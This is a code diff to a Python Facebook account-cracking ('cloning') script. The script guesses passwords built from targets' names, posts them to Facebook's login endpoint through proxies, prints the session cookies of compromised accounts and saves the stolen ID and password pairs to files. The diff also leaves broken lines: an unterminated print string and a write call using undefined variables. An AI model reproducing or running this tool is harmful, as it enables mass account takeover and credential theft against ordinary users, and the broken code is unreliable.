@@ -412,6 +412,7 @@ def passwrd():
 	os.system('clear')
 	banner()
 	print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTOTAL IDz :\033[0;97m '+str(len(id)))
+	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;94mYOUR OK IDz SAVED • /sdcard/SHANTO•Ok💚.txt
 	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;95mCloning Speed Super Fast")
 	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTURN ON/OFF FLIGHT MODE IN EVERY 5 MIN")
 	SHANTOj(f'\033[0;97m===============================================')
@@ -428,9 +429,9 @@ def passwrd():
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
 					pwv.append(nmf)
-					pwv.append('57273200')
+					pwv.append('i love you')
 					pwv.append(frs+'@')
-					pwv.append(frs+'AABBCC')
+					pwv.append(frs+'@123')
 					pwv.append(frs+'@@')
 					pwv.append(frs+'@@@')
 					pwv.append(frs+'@@@@')
@@ -447,7 +448,7 @@ def passwrd():
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
 					pwv.append(nmf)
-					pwv.append('57273200')
+					pwv.append('i love you')
 					pwv.append(frs+'@')
 					pwv.append(frs+'@123')
 					pwv.append(frs+'@@')
@@ -487,9 +488,9 @@ def crack(idf,pwv):
 			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				#SHANTO-King
-				print(f'\r\033[0;94m[{time.strftime("%H:%M")}â€¢SHANTO-Cp] {idf} â€¢ {pw}\n\033[0;93[ðŸ¤Ÿ]= COOKIESâ€¢ \033[0;92m{kuki} ')     
+				print(f'\r\033[0;94m[{time.strftime("%H:%M")}â€¢SHANTO-Cp] {idf} '    
 				os.system('espeak -a 300 " C,  P"')
-			    #open('CP/'+cpc,'a').write(idf+' | '+pw+'\n')
+			    open('CP/'+cpc,'a').write(idf+' | '+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
@@ -498,10 +499,10 @@ def crack(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				#SHANTO-King
-				print(f'\r\033[0;92m[SHANTO-OK] {idf} 🤍 {pw}\n\033[0;93mCOOKIES 🐸 \033[0;92m{kuki} ')
+				print(f'\r\033[0;92m[SHANTO-OK] {idf} 🥰 {pw}\n\033[0;93m[🌺] = COOKIES 🐸 \033[0;92m{kuki} ')
 				print('\033[0;94m===============================================')
 				os.system('espeak -a 300 " SHANTO,  Ok,  id"')
-				open('OK/'+okc,'a').write(idf+' â€¢ '+pw+'\n')
+				open(f'/sdcard/SHANTO•OK•M1.txt', 'a').write(ids+'|'+paw+'\n')
 				cek_apk(session,coki)
 				break
 				
